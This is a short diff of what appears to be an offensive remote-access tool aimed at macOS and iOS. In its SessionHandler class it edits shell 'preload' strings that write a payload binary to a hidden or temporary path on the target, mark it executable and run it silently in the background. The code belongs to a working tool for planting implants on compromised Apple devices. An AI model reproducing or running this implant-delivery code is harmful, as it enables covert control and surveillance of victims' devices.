@@ -49,8 +49,6 @@ BANNER_MENU_TEXT = WHITE + "-"*40 + "\n" + """ Menu:
 """ + WHITE + "-"*40
 BANNER = BANNER_ART_TEXT + "" + BANNER_MENU_TEXT + "\n" + NES
 
-
-
 def interactiveMenu():
     while 1:
         os.system('clear')
@@ -500,14 +498,14 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplosx", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
+            preload = "rm /private/tmp/espl 2> /dev/null;cat >/private/tmp/espl;chmod +x /private/tmp/espl;/private/tmp/espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "arm" in CDA:
             if verbose:
                 print strinfo("Detected iOS")
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /usr/bin/.espl 2> /dev/null;cat >/usr/bin/.espl;chmod +x /usr/bin/.espl;/usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" > /dev/null &\n"
+            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; exit & /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
